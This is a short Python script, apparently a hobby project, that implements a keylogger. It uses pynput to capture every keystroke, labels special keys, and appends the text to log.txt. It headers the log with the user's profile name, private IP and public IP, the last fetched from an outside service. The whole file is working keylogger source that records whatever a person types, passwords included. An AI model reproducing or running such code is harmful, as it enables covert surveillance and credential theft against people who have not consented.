# -*- coding: utf-8 -*-
"""
Created on Fri Apr  3 21:00:21 2020

@author: vieth
"""

import pynput
import requests
import socket
import os
import time

from pynput.keyboard import Key, Listener

count = 0
keys = []

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

print (privateIP)
print (user)
print(publicIP)

msg = f'\n\n[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
keys.append(msg)

def on_press(key):
    global keys, count
    
    #key = str(key).strip('\'')
    
    substitution = ['Key.enter', ' [ENTER]\n', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
	'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ', 
	'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13', 
	' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd', 
	' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ',
    '\\x1a', ' [CTRL-Z] ']

    key = str(key).strip('\'')
    if key in substitution:
        keys.append(substitution[substitution.index(key)+1])
    else:
        keys.append(key)

    count += 1
    print("{0} pressed".format(key))
    
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("\'","")
            
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

